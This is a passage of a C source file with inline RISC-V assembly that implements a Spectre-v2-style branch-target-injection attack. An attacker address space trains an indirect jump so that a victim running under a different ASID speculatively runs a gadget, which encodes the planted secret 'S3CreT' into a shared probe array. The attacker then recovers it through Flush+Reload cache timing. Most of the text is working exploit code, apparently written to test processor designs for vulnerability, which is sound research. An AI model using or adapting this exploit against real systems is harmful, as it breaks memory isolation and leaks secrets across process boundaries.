#include <am.h>
#include <klib.h>
#include <stdint.h>
#include <xsextra.h>

#include "encoding.h"
#include "cache-utils.h"

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 10
#endif

#ifndef ROUNDS
#define ROUNDS 1
#endif

#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 2
#endif

#ifndef EARLY_STOP
#define EARLY_STOP 1
#endif

#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 3
#endif

#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 2
#endif

#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif

#ifndef SECRET_OFFSET
#define SECRET_OFFSET 0
#endif

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif

#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif

#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif

#ifndef FULL_BYTE_PROBE
#define FULL_BYTE_PROBE 0
#endif

#ifndef FLUSH_LINES
#define FLUSH_LINES PROBE_ENTRIES
#endif


#ifndef V2_ATTACK_TRIES
#define V2_ATTACK_TRIES 16
#endif

#ifndef V2_TRAINING_LOOPS
#define V2_TRAINING_LOOPS 32
#endif

#ifndef V2_BYTE_WARMUP_ROUNDS
#define V2_BYTE_WARMUP_ROUNDS 0
#endif

#ifndef V2_ASM_CONTROL_ROUND
#define V2_ASM_CONTROL_ROUND 0
#endif

#ifndef V2_PROBE_CONTROL_ROUND
#define V2_PROBE_CONTROL_ROUND 0
#endif
#ifndef V2_INTERNAL_FLUSH_LINES
#define V2_INTERNAL_FLUSH_LINES 256
#endif
#ifndef V2_SKIP_CHAIN_CBO_FLUSH
#define V2_SKIP_CHAIN_CBO_FLUSH 0
#endif

#ifndef V2_PROBE_MIX
#define V2_PROBE_MIX 0
#endif

#ifndef V2_EARLY_STOP_STRICT
#define V2_EARLY_STOP_STRICT 0
#endif

#ifndef V2_FIXED_MARKER
#define V2_FIXED_MARKER -1
#endif

#ifndef V2_ASM_STYLE
#define V2_ASM_STYLE 0
#endif
#ifndef KMHV3_CANDIDATE_ONLY
#define KMHV3_CANDIDATE_ONLY 0
#endif
#ifndef V2_SERVICE_FLUSH_BEFORE_VICTIM
#define V2_SERVICE_FLUSH_BEFORE_VICTIM 0
#endif

#ifndef CONTROL_ONLY
#define CONTROL_ONLY 0
#endif
#ifndef SKIP_DIRECT_ISOLATION_CHECK
#define SKIP_DIRECT_ISOLATION_CHECK 0
#endif

#ifndef SMOKE_ENTRY_ONLY
#define SMOKE_ENTRY_ONLY 0
#endif

#ifndef SMOKE_AFTER_DIRECT_ONLY
#define SMOKE_AFTER_DIRECT_ONLY 0
#endif

#ifndef SMOKE_AFTER_FLUSH_ONLY
#define SMOKE_AFTER_FLUSH_ONLY 0
#endif

#ifndef SMOKE_BEFORE_VICTIM_ONLY
#define SMOKE_BEFORE_VICTIM_ONLY 0
#endif

#ifndef SMOKE_AFTER_ATTACK_FLUSH_ONLY
#define SMOKE_AFTER_ATTACK_FLUSH_ONLY 0
#endif

#ifndef SMOKE_AFTER_FIRST_VICTIM_ONLY
#define SMOKE_AFTER_FIRST_VICTIM_ONLY 0
#endif

#ifndef SMOKE_AFTER_TRAINING_ONLY
#define SMOKE_AFTER_TRAINING_ONLY 0
#endif

#ifndef SMOKE_AFTER_PROBE_ONLY
#define SMOKE_AFTER_PROBE_ONLY 0
#endif

#ifndef SMOKE_TRACE
#define SMOKE_TRACE 0
#endif

#ifndef SMOKE_FAST_BOOT
#define SMOKE_FAST_BOOT 0
#endif

#ifndef USE_BASELINE_SUBTRACT
#define USE_BASELINE_SUBTRACT 0
#endif

#ifndef ATTACKER_ASID
#define ATTACKER_ASID 17u
#endif

#ifndef VICTIM_ASID
#define VICTIM_ASID 23u
#endif

#define ASID16(x) ((x) & 0xffffu)

#if ASID16(ATTACKER_ASID) == 0 || ASID16(VICTIM_ASID) == 0
#error "ATTACKER_ASID and VICTIM_ASID must be non-zero after 16-bit normalization"
#endif

#if ASID16(ATTACKER_ASID) == ASID16(VICTIM_ASID)
#error "ATTACKER_ASID and VICTIM_ASID must differ after 16-bit normalization"
#endif

#ifndef FENCE_ON_ASID_SWITCH
#define FENCE_ON_ASID_SWITCH 0
#endif

#define PROBE_ENTRIES 256u
#define PROBE_STRIDE L1_BLOCK_SZ_BYTES
_Static_assert(PROBE_STRIDE == 64, "victim_process_gadget assumes 64-byte probe stride");

#define SVC_VICTIM 1u
#define SVC_FLUSH_PROBE 2u
#define SVC_EXIT 3u
#define SVC_VICTIM_DONE 4u

#define MCAUSE_USER_ECALL 8u
#define MCAUSE_LOAD_ACCESS_FAULT 5u
#define MCAUSE_LOAD_PAGE_FAULT 13u
#define MSTATUS_MPP_MASK (3ull << 11)

#define PAGE_SHIFT 12u
#define PAGE_SIZE (1ull << PAGE_SHIFT)
#define PTES_PER_PT 512u
#define PT_L2_PAGES 4u
#define PT_L1_PAGES 16u
#define PT_L0_PAGES 64u
#define SATP_MODE_SV48 (9ull << 60)
#define SATP_ASID_SHIFT 44u
#define SATP_ASID_MASK (0xffffull << SATP_ASID_SHIFT)
#define VPTE_V (1ull << 0)
#define VPTE_R (1ull << 1)
#define VPTE_W (1ull << 2)
#define VPTE_X (1ull << 3)
#define VPTE_U (1ull << 4)
#define VPTE_A (1ull << 6)
#define VPTE_D (1ull << 7)

#define PUBLIC_ARRAY1_SZ 16u
#define U_TEXT __attribute__((section(".u_text"), noinline, aligned(16)))
#define A_DATA __attribute__((section(".a_data"), aligned(4096)))
#define V_DATA __attribute__((section(".v_data"), aligned(4096)))
#define SHARED_DATA __attribute__((section(".shared_data"), aligned(4096)))

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_start\n"
    "__u_text_start:\n"
    ".previous\n");

asm(
    ".section .a_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __a_data_start\n"
    "__a_data_start:\n"
    ".previous\n");

static uint8_t A_DATA attacker_stack[16 * 1024];
static uint8_t A_DATA leaked_idx[SECRET_SZ][2];
static uint64_t A_DATA leaked_score[SECRET_SZ][2];

static uint8_t A_DATA leaked_top_idx[SECRET_SZ][4];
static uint64_t A_DATA leaked_top_score[SECRET_SZ][4];
static uint64_t A_DATA leaked_hits[SECRET_SZ][PROBE_ENTRIES];
static uint64_t A_DATA rounds_used[SECRET_SZ];
static uint64_t A_DATA active_threshold;
static volatile uint64_t A_DATA direct_victim_fault_expected;
static volatile uint64_t A_DATA direct_victim_fault_seen;
static volatile uint64_t A_DATA direct_victim_read_completed;
static volatile uint64_t A_DATA direct_victim_read_value;

asm(
    ".section .shared_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __shared_data_start\n"
    "__shared_data_start:\n"
    ".previous\n");

static uint8_t SHARED_DATA shared_probe[PROBE_ENTRIES * PROBE_STRIDE];
static volatile uint8_t SHARED_DATA m_dummy;

asm(
    ".section .v_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __v_data_start\n"
    "__v_data_start:\n"
    ".previous\n");

static uint8_t V_DATA victim_secret[16] = "S3CreT";
static volatile uintptr_t V_DATA v2_train_root __attribute__((aligned(64)));
static volatile uintptr_t V_DATA v2_train_mid __attribute__((aligned(64)));
static volatile uintptr_t V_DATA v2_train_node __attribute__((aligned(64)));
static volatile uintptr_t V_DATA v2_attack_root __attribute__((aligned(64)));
static volatile uintptr_t V_DATA v2_attack_mid __attribute__((aligned(64)));
static volatile uintptr_t V_DATA v2_attack_node __attribute__((aligned(64)));
static volatile uint8_t V_DATA v2_public_dummy __attribute__((aligned(64)));
static volatile uint64_t V_DATA victim_arg_idx;
static volatile uintptr_t V_DATA victim_arg_probe;
static uint8_t V_DATA victim_stack[16 * 1024];

static volatile uint64_t trap_count;
static volatile uint64_t victim_call_count;
static volatile uint64_t victim_done_count;
static volatile uint64_t flush_call_count;
static volatile uint64_t exit_call_count;
static volatile uint64_t bad_trap_count;
static volatile uint64_t last_mcause;
static volatile uint64_t last_mepc;
static volatile int attack_done;
static volatile int attack_status;
static volatile int victim_trap_return_to_machine;
static uintptr_t saved_main_m_sp;
static uintptr_t saved_victim_m_sp __attribute__((used));
static uint8_t m_stack[16 * 1024] __attribute__((aligned(16)));
static volatile uintptr_t observed_attacker_satp;
static volatile uintptr_t observed_victim_satp;
static volatile uintptr_t attacker_satp_for_trap;
static volatile uintptr_t current_trap_frame_sp;
static volatile uintptr_t saved_attacker_trap_sp;
static volatile uintptr_t saved_attacker_mscratch;
static volatile uintptr_t resume_attacker_epc;

struct page_space {
  uint64_t root[PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l2[PT_L2_PAGES][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l1[PT_L1_PAGES][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l0[PT_L0_PAGES][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l2_used;
  uint64_t l1_used;
  uint64_t l0_used;
  uint64_t asid;
  uintptr_t satp;
} __attribute__((aligned(PAGE_SIZE)));

static struct page_space attacker_space;
static struct page_space victim_space;

extern char __u_text_start[];
extern char __u_text_end[];
extern char __a_data_start[];
extern char __a_data_end[];
extern char __shared_data_start[];
extern char __shared_data_end[];
extern char __v_data_start[];
extern char __v_data_end[];

static inline uintptr_t page_down(uintptr_t addr)
{
  return addr & ~(uintptr_t)(PAGE_SIZE - 1);
}

static inline uintptr_t page_up(uintptr_t addr)
{
  return (addr + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
}

static void zero_page(void *page)
{
  uint64_t *p = (uint64_t *)page;
  for (uint64_t i = 0; i < PTES_PER_PT; ++i)
    p[i] = 0;
}

static int alloc_l2(struct page_space *space)
{
  if (space->l2_used >= PT_L2_PAGES)
    return -1;
  zero_page(space->l2[space->l2_used]);
  return (int)space->l2_used++;
}

static int alloc_l1(struct page_space *space)
{
  if (space->l1_used >= PT_L1_PAGES)
    return -1;
  zero_page(space->l1[space->l1_used]);
  return (int)space->l1_used++;
}

static int alloc_l0(struct page_space *space)
{
  if (space->l0_used >= PT_L0_PAGES)
    return -1;
  zero_page(space->l0[space->l0_used]);
  return (int)space->l0_used++;
}

static uint64_t *walk_page(struct page_space *space, uintptr_t va, int alloc)
{
  uintptr_t vpn3 = (va >> 39) & 0x1ffu;
  uintptr_t vpn2 = (va >> 30) & 0x1ffu;
  uintptr_t vpn1 = (va >> 21) & 0x1ffu;
  uintptr_t vpn0 = (va >> 12) & 0x1ffu;
  uint64_t *l2;
  uint64_t *l1;
  uint64_t *l0;
  int idx;

  if ((space->root[vpn3] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l2(space);
    if (idx < 0)
      return NULL;
    space->root[vpn3] =
        (((uintptr_t)space->l2[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l2 = (uint64_t *)(((space->root[vpn3] >> 10) << PAGE_SHIFT));

  if ((l2[vpn2] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l1(space);
    if (idx < 0)
      return NULL;
    l2[vpn2] = (((uintptr_t)space->l1[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l1 = (uint64_t *)(((l2[vpn2] >> 10) << PAGE_SHIFT));

  if ((l1[vpn1] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l0(space);
    if (idx < 0)
      return NULL;
    l1[vpn1] = (((uintptr_t)space->l0[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l0 = (uint64_t *)(((l1[vpn1] >> 10) << PAGE_SHIFT));
  return &l0[vpn0];
}

static int map_identity_page(struct page_space *space, uintptr_t va, uint64_t perm)
{
  uint64_t *pte = walk_page(space, va, 1);
  if (pte == NULL)
    return -1;
  *pte = ((va >> PAGE_SHIFT) << 10) | VPTE_V | VPTE_A | perm |
         ((perm & VPTE_W) ? VPTE_D : 0);
  return 0;
}

static int map_identity_range(struct page_space *space, uintptr_t start,
                              uintptr_t end, uint64_t perm)
{
  uintptr_t cur = page_down(start);
  uintptr_t limit = page_up(end);
  for (; cur < limit; cur += PAGE_SIZE) {
    if (map_identity_page(space, cur, perm) != 0)
      return -1;
  }
  return 0;
}

static void init_page_space(struct page_space *space, uint64_t asid)
{
  zero_page(space->root);
  space->l2_used = 0;
  space->l1_used = 0;
  space->l0_used = 0;
  space->asid = ASID16(asid);
  space->satp = SATP_MODE_SV48 |
                (space->asid << SATP_ASID_SHIFT) |
                (((uintptr_t)space->root) >> PAGE_SHIFT);
}

static inline uintptr_t switch_satp(uintptr_t satp, int flush)
{
  uintptr_t observed;

  asm volatile("csrw satp, %0" :: "r"(satp) : "memory");
  if (flush)
    asm volatile("sfence.vma zero, zero" ::: "memory");
  asm volatile("fence.i\ncsrr %0, satp" : "=r"(observed) :: "memory");
  return observed;
}

static void install_asid_page_tables(void)
{
  init_page_space(&attacker_space, ATTACKER_ASID);
  init_page_space(&victim_space, VICTIM_ASID);
  attacker_satp_for_trap = attacker_space.satp;

  if (map_identity_range(&attacker_space, (uintptr_t)__u_text_start,
                         (uintptr_t)__u_text_end, VPTE_R | VPTE_X | VPTE_U) != 0)
    panic("map attacker u_text failed");
  if (map_identity_range(&victim_space, (uintptr_t)__u_text_start,
                         (uintptr_t)__u_text_end, VPTE_R | VPTE_X | VPTE_U) != 0)
    panic("map victim u_text failed");
  if (map_identity_range(&attacker_space, (uintptr_t)__a_data_start,
                         (uintptr_t)__a_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map attacker data failed");
  if (map_identity_range(&attacker_space, (uintptr_t)__shared_data_start,
                         (uintptr_t)__shared_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map attacker shared data failed");
  if (map_identity_range(&victim_space, (uintptr_t)__shared_data_start,
                         (uintptr_t)__shared_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map victim shared data failed");
  if (map_identity_range(&victim_space, (uintptr_t)__v_data_start,
                         (uintptr_t)__v_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map victim data failed");
}

static U_TEXT int is_candidate_value(uint64_t value)
{
  return (value >= '0' && value <= '9') ||
         (value >= 'A' && value <= 'Z') ||
         (value >= 'a' && value <= 'z');
}

static U_TEXT uint64_t reload_mix(uint64_t i, uint64_t try_no)
{
#if KMHV3_CANDIDATE_ONLY
  (void)try_no;
  if (i < 8)
    return (uint64_t)'S' + i;
  return 0;
#elif V2_PROBE_MIX == 1
  (void)try_no;
  return ((i * 167u) + 13u) & 255u;
#else
  uint64_t x = (i + try_no * 73u) & 255u;
  x ^= (x << 3) & 255u;
  x ^= x >> 5;
  x ^= (x << 1) & 255u;
  return x & 255u;
#endif
}

static U_TEXT uint64_t candidate_value(uint64_t idx)
{
  if (idx < 10)
    return '0' + idx;
  if (idx < 36)
    return 'A' + (idx - 10);
  return 'a' + (idx - 36);
}

static U_TEXT __attribute__((unused)) uint64_t candidate_probe_value(uint64_t idx)
{
#if FULL_BYTE_PROBE
  return ((idx * 167u) + 13u) & 255u;
#else
  return candidate_value((idx * 17u + 13u) % 62u);
#endif
}

static U_TEXT __attribute__((unused)) int is_training_value(uint64_t value)
{
  for (uint64_t i = 1; i <= PUBLIC_ARRAY1_SZ; ++i) {
    if (value == i)
      return 1;
  }
  return 0;
}

static U_TEXT void top_two_idx(uint64_t *in, uint64_t count,
                               uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (uint64_t i = 0; i < count; ++i) {
    if (in[i] > out_score[0]) {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = in[i];
      out_idx[0] = i;
    } else if (in[i] > out_score[1]) {
      out_score[1] = in[i];
      out_idx[1] = i;
    }
  }
}

static U_TEXT void top_four_idx(uint64_t *in, uint64_t count,
                                uint8_t out_idx[4], uint64_t out_score[4])
{
  for (uint64_t i = 0; i < 4; ++i) {
    out_idx[i] = 0;
    out_score[i] = 0;
  }

  for (uint64_t i = 0; i < count; ++i) {
    uint64_t score = in[i];
    for (uint64_t j = 0; j < 4; ++j) {
      if (score > out_score[j]) {
        for (uint64_t k = 3; k > j; --k) {
          out_score[k] = out_score[k - 1];
          out_idx[k] = out_idx[k - 1];
        }
        out_score[j] = score;
        out_idx[j] = i;
        break;
      }
    }
  }
}

static U_TEXT __attribute__((unused)) int enough_confidence(uint64_t *results)
{
  uint8_t idx[2];
  uint64_t score[2];

  top_two_idx(results, PROBE_ENTRIES, idx, score);
  (void)idx;
#if V2_EARLY_STOP_STRICT
  return score[0] >= (2u * score[1] + 5u) ||
         (score[0] == 2u && score[1] == 0u);
#else
  return score[0] >= EARLY_STOP_MIN_SCORE &&
         score[0] >= score[1] + EARLY_STOP_GAP;
#endif
}


static U_TEXT uint64_t u_probe_time(volatile uint8_t *addr)
{
  uint64_t start;
  uint64_t end;
  uint8_t dummy;

  asm volatile(
      "fence rw, rw\n"
      "rdcycle %[start]\n"
      "lbu %[dummy], 0(%[addr])\n"
      "fence rw, rw\n"
      "rdcycle %[end]\n"
      : [start] "=&r"(start), [end] "=&r"(end), [dummy] "=&r"(dummy)
      : [addr] "r"(addr)
      : "memory");
  (void)dummy;
  return end - start;
}

static U_TEXT __attribute__((unused)) void probe_direct_victim_access(void)
{
  uint64_t value = 0;

  direct_victim_fault_seen = 0;
  direct_victim_read_completed = 0;
  direct_victim_read_value = 0;
  direct_victim_fault_expected = 1;
  asm volatile("lbu %0, 0(%1)" : "=&r"(value) : "r"(victim_secret) : "memory");
  direct_victim_fault_expected = 0;
  if (!direct_victim_fault_seen) {
    direct_victim_read_value = value;
    direct_victim_read_completed = 1;
  }
}

static void flush_probe_service(uint8_t *probe)
{
#if KMHV3_CANDIDATE_ONLY
  for (uint64_t i = 0; i < PROBE_CANDIDATES && i < 8; ++i) {
    uint64_t value = (uint64_t)'S' + i;
    xs_flush_cache_line(&probe[value * PROBE_STRIDE]);
  }
#else
  for (uint64_t i = 0; i < FLUSH_LINES; ++i)
    xs_flush_cache_line(&probe[i * PROBE_STRIDE]);
#endif

  xs_fence();
}

void v2_round_asm_impl(char *secret_addr, volatile uint8_t *probe);
void v2_asm_gadget(void);
void v2_asm_safe(void);

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".option push\n"
    ".option norvc\n"
    ".balign 64\n"
    ".globl v2_round_asm_impl\n"
    "v2_round_asm_impl:\n"
    "  addi sp, sp, -80\n"
    "  sd   ra, 0(sp)\n"
    "  sd   s1, 8(sp)\n"
    "  sd   s2, 16(sp)\n"
    "  sd   s3, 24(sp)\n"
    "  sd   s4, 32(sp)\n"
    "  sd   s5, 40(sp)\n"
    "  sd   s6, 48(sp)\n"
    "  mv   s4, a0\n"
    "  mv   s1, a1\n"
    "  la   s3, v2_public_dummy\n"
    "  li   s2, " STR(V2_TRAINING_LOOPS) "\n"
#if V2_ASM_STYLE == 1
    "  la   s5, v2_asm_gadget\n"
    "  la   s6, v2_asm_safe\n"
#else
    "  la   s5, v2_train_root\n"
    "  la   s6, v2_attack_root\n"
#endif
    "  beqz s4, .Lv2_use_dummy\n"
    "  j    .Lv2_have_addr\n"
    ".Lv2_use_dummy:\n"
    "  mv   s4, s3\n"
    ".Lv2_have_addr:\n"
    "  lbu  t0, 0(s4)\n"
    "  mv   t1, s1\n"
    "  li   t0, 0\n"
    "  li   t2, " STR(V2_INTERNAL_FLUSH_LINES) "\n"
    ".Lv2_flush_channel:\n"
#if V2_INTERNAL_FLUSH_LINES == 0
    "  lbu  x0, 0(t1)\n"
#else
    "  cbo.flush 0(t1)\n"
#endif
    "  addi t1, t1, 64\n"
    "  addi t0, t0, 1\n"
    "  bltu t0, t2, .Lv2_flush_channel\n"
    "  fence rw, rw\n"
    ".Lv2_round:\n"
    "  sltiu t4, s2, 1\n"
    "  neg   t4, t4\n"
    "  xor   t5, s3, s4\n"
    "  and   t5, t5, t4\n"
    "  xor   a0, s3, t5\n"
    "  xor   t5, s5, s6\n"
    "  and   t5, t5, t4\n"
    "  xor   t3, s5, t5\n"
#if V2_ASM_STYLE == 1
    "  addi t3, t3, -2\n"
    "  addi t1, zero, 2\n"
    "  slli t2, t1, 0x4\n"
    "  fcvt.s.lu fa4, t1\n"
    "  fcvt.s.lu fa5, t2\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fdiv.s fa5, fa5, fa4\n"
    "  fcvt.lu.s t2, fa5, rtz\n"
    "  add  t2, t3, t2\n"
#else
    "  la    t0, v2_train_root\n"
#if V2_SKIP_CHAIN_CBO_FLUSH
    "  lbu  x0, 0(t0)\n"
#else
    "  cbo.flush 0(t0)\n"
#endif
    "  la    t0, v2_train_mid\n"
#if V2_SKIP_CHAIN_CBO_FLUSH
    "  lbu  x0, 0(t0)\n"
#else
    "  cbo.flush 0(t0)\n"
#endif
    "  la    t0, v2_train_node\n"
#if V2_SKIP_CHAIN_CBO_FLUSH
    "  lbu  x0, 0(t0)\n"
#else
    "  cbo.flush 0(t0)\n"
#endif
    "  la    t0, v2_attack_root\n"
#if V2_SKIP_CHAIN_CBO_FLUSH
    "  lbu  x0, 0(t0)\n"
#else
    "  cbo.flush 0(t0)\n"
#endif
    "  la    t0, v2_attack_mid\n"
#if V2_SKIP_CHAIN_CBO_FLUSH
    "  lbu  x0, 0(t0)\n"
#else
    "  cbo.flush 0(t0)\n"
#endif
    "  la    t0, v2_attack_node\n"
#if V2_SKIP_CHAIN_CBO_FLUSH
    "  lbu  x0, 0(t0)\n"
#else
    "  cbo.flush 0(t0)\n"
#endif
    "  fence rw, rw\n"
    "  ld    t2, 0(t3)\n"
    "  ld    t2, 0(t2)\n"
    "  ld    t2, 0(t2)\n"
#endif
    ".balign 64\n"
    ".Lv2_indirect_site:\n"
    "  jalr  x0, t2, 0\n"
    ".balign 64\n"
    ".globl v2_asm_gadget\n"
    "v2_asm_gadget:\n"
#if V2_FIXED_MARKER >= 0
    "  li   t1, " STR(V2_FIXED_MARKER) "\n"
#else
    "  lbu  t1, 0(a0)\n"
#endif
    "  slli t1, t1, 6\n"
    "  add  t1, s1, t1\n"
    "  lbu  x0, 0(t1)\n"
    "  j    .Lv2_continue\n"
    ".balign 64\n"
    ".globl v2_asm_safe\n"
    "v2_asm_safe:\n"
    "  andi t1, a0, 1\n"
    "  j    .Lv2_continue\n"
    ".Lv2_continue:\n"
    "  beqz s2, .Lv2_done\n"
    "  addi s2, s2, -1\n"
    "  j    .Lv2_round\n"
    ".Lv2_done:\n"
    "  ld   ra, 0(sp)\n"
    "  ld   s1, 8(sp)\n"
    "  ld   s2, 16(sp)\n"
    "  ld   s3, 24(sp)\n"
    "  ld   s4, 32(sp)\n"
    "  ld   s5, 40(sp)\n"
    "  ld   s6, 48(sp)\n"
    "  addi sp, sp, 80\n"
    "  ret\n"
    ".option pop\n");

static void init_v2_target_chain(void)
{
  v2_public_dummy = 0;
  v2_train_node = (uintptr_t)v2_asm_gadget;
  v2_train_mid = (uintptr_t)&v2_train_node;
  v2_train_root = (uintptr_t)&v2_train_mid;
  v2_attack_node = (uintptr_t)v2_asm_safe;
  v2_attack_mid = (uintptr_t)&v2_attack_node;
  v2_attack_root = (uintptr_t)&v2_attack_mid;
}

static U_TEXT __attribute__((noreturn, unused)) void victim_process_entry(void)
{
  v2_round_asm_impl((char *)victim_arg_idx,
                    (volatile uint8_t *)victim_arg_probe);

  register uint64_t a7 asm("a7") = SVC_VICTIM_DONE;
  asm volatile("ecall" :: "r"(a7) : "memory");
  for (;;)
    asm volatile("wfi");
}

static void run_victim_process(uint64_t idx, volatile uint8_t *probe)
{
  uintptr_t victim_sp = (uintptr_t)victim_stack + sizeof(victim_stack) - 16;
  uintptr_t machine_sp = (uintptr_t)m_stack + (sizeof(m_stack) / 2) - 16;
  uintptr_t saved_mscratch;
  uintptr_t mstatus;

  victim_arg_idx = idx;
  victim_arg_probe = (uintptr_t)probe;
  victim_trap_return_to_machine = 0;

  asm volatile("csrr %0, mscratch" : "=r"(saved_mscratch));
  observed_victim_satp = switch_satp(victim_space.satp, FENCE_ON_ASID_SWITCH);
  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~MSTATUS_MPP_MASK) | (0ull << 11);

  asm volatile(
      "la t0, saved_victim_m_sp\n"
      "sd sp, 0(t0)\n"
      "csrw mscratch, %[machine_sp]\n"
      "mv sp, %[victim_sp]\n"
      "csrw mstatus, %[mstatus]\n"
      "csrw mepc, %[entry]\n"
      "mret\n"
      ".globl victim_machine_return\n"
      "victim_machine_return:\n"
      "la t0, saved_victim_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : [machine_sp] "r"(machine_sp),
        [victim_sp] "r"(victim_sp),
        [mstatus] "r"(mstatus),
        [entry] "r"((uintptr_t)victim_process_entry)
      : "t0", "memory");

  asm volatile("csrw mscratch, %0" :: "r"(saved_mscratch) : "memory");
  observed_attacker_satp = switch_satp(attacker_space.satp, FENCE_ON_ASID_SWITCH);
}

void m_trap_dispatch(uint64_t cause, uint64_t epc,
                     uint64_t a0, uint64_t a1, uint64_t a7)
{
  trap_count++;
  last_mcause = cause;
  last_mepc = epc;

  if ((cause == MCAUSE_LOAD_ACCESS_FAULT || cause == MCAUSE_LOAD_PAGE_FAULT) &&
      direct_victim_fault_expected != 0) {
    direct_victim_fault_seen = 1;
    direct_victim_fault_expected = 0;
    return;
  }

  if (cause != MCAUSE_USER_ECALL) {
    bad_trap_count++;
    attack_status = 2;
    attack_done = 1;
    return;
  }

  if (a7 == SVC_VICTIM) {
    victim_call_count++;
    resume_attacker_epc = epc + 4;
    saved_attacker_trap_sp = current_trap_frame_sp;
    asm volatile("csrr %0, mscratch" : "=r"(saved_attacker_mscratch));
    run_victim_process(a0, (volatile uint8_t *)a1);
  } else if (a7 == SVC_VICTIM_DONE) {
    victim_done_count++;
    victim_trap_return_to_machine = 1;
  } else if (a7 == SVC_FLUSH_PROBE) {
    flush_call_count++;
    flush_probe_service((uint8_t *)a0);
  } else if (a7 == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }
}

void m_trap_entry(void);
asm(
    ".section .text\n"
    ".align 2\n"
    ".globl m_trap_entry\n"
    "m_trap_entry:\n"
    "  csrrw sp, mscratch, sp\n"
    "  addi sp, sp, -160\n"
    "  sd ra, 0(sp)\n"
    "  sd t0, 8(sp)\n"
    "  sd t1, 16(sp)\n"
    "  sd t2, 24(sp)\n"
    "  la t0, current_trap_frame_sp\n"
    "  sd sp, 0(t0)\n"
    "  sd a0, 32(sp)\n"
    "  sd a1, 40(sp)\n"
    "  sd a2, 48(sp)\n"
    "  sd a3, 56(sp)\n"
    "  sd a4, 64(sp)\n"
    "  sd a5, 72(sp)\n"
    "  sd a6, 80(sp)\n"
    "  sd a7, 88(sp)\n"
    "  csrr a0, mcause\n"
    "  csrr a1, mepc\n"
    "  ld a2, 32(sp)\n"
    "  ld a3, 40(sp)\n"
    "  ld a4, 88(sp)\n"
    "  call m_trap_dispatch\n"
    "  la t0, victim_trap_return_to_machine\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 2f\n"
    "  la t0, attack_done\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 3f\n"
    "  csrr t0, mepc\n"
    "  addi t0, t0, 4\n"
    "  csrw mepc, t0\n"
    "1:\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  csrrw sp, mscratch, sp\n"
    "  mret\n"
    "2:\n"
    "  sw zero, 0(t0)\n"
    "  la t0, saved_attacker_mscratch\n"
    "  ld t1, 0(t0)\n"
    "  csrw mscratch, t1\n"
    "  la t0, attacker_satp_for_trap\n"
    "  ld t1, 0(t0)\n"
    "  csrw satp, t1\n"
    "  fence.i\n"
    "  csrr t1, satp\n"
    "  la t0, observed_attacker_satp\n"
    "  sd t1, 0(t0)\n"
    "  la t0, resume_attacker_epc\n"
    "  ld t1, 0(t0)\n"
    "  csrw mepc, t1\n"
    "  li t0, 0x21800\n"
    "  csrc mstatus, t0\n"
        "  la t0, saved_attacker_trap_sp\n"
    "  ld sp, 0(t0)\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  csrrw sp, mscratch, sp\n"
    "  mret\n"
    "3:\n"
    "  la t0, machine_low_return\n"
    "  csrw mepc, t0\n"
    "  li t0, 0x21800\n"
    "  csrc mstatus, t0\n"
